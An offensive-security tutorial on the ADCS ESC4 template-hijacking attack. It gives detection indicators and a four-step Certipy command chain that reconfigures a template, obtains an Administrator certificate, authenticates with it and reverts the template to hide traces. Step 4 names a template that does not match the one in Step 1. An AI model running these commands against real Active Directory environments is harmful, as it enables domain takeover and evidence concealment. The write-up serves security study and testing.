# ESC4: Template Hijacking


### Overview:
ESC4 occurs when an attacker gains permissions to modify a certificate template stored in Active directory.

Certificate templates are AD objects residing in the Configuration Naming Context (under `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=...`) and are protected by ACLs. If an attacker obtains `Write` access - such as `WriteDACL` (to change permissions), `WriteOwner` (to take ownership and then change permissions), specific `WriteProperty` rights on critical attributes, or `FullControl` - over a template object, they can alter its configuration.
This modification can turn a previously secure template into one vulnerable to other attack scenarios, most commonly ESC1 (Enrollee-Supplied Subject for Client Authentication) or ESC2 (Any Purpose Certificate).

---

### Key indicators:

- Certipy's explicit flag: `[!] Vulnerabilities ESC4 : User has dangerous permissions.`
- The `[+] User ACL Principals` field indicates that the current user possesses some form of write/control rights over the template object, often inherited from a group like `CORP.LOCAL\Authenticated Users` if that group is listed under `Full Control Principals`, `Write Owner Principals`, or `Write Dacl Principals`.
- Any non-administrative user or overly broad group listed under `Full Control Principals`, `Write Owner Principals`, `Write Dacl Principals`, or specific `Write Property` ACEs for critical template attributes.

 >_Note: Enterprise CAs periodically poll Active Directory for template changes. It might take a few minutes (up to several hours, depending on CA configuration and AD replication) for the CA to recognize and load the updated template configuration._
 
 
 ***
 ### Exploitation:
 
 Exploiting ESC4 involves an attacker with write permissions on a template first modifying it to a vulnerable configuration (e.g., to resemble an ESC1 scenario), then requesting a certificate using this maliciously altered template

**Step 1: Modify the template to a vulnerable state.** Certipy's `template` command with the `-write-default-configuration` option is a convenient way to automatically reconfigure a target template to a known ESC1-like vulnerable state

```bash
certipy template \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -template 'ESC4' \
    -write-default-configuration
```

**Step 2: Request a certificate using the modified template.** The attacker now requests a certificate for a privileged user (e.g., Administrator), leveraging the ESC1 vulnerability they just created in the "ESC4" template.

```shell
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'ESC4' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500'
```

**Step 3: Authenticate using the obtained certificate.**

```shell
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

**Step 4: (Optional) Revert template changes.** To restore the original template configuration and remove traces of the malicious modification, the attacker uses the `SecureFiles.json` file saved in Step 1.

```shell
certipy template \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -template 'SecureFiles' \
    -write-configuration 'SecureFiles.json' -no-save
```
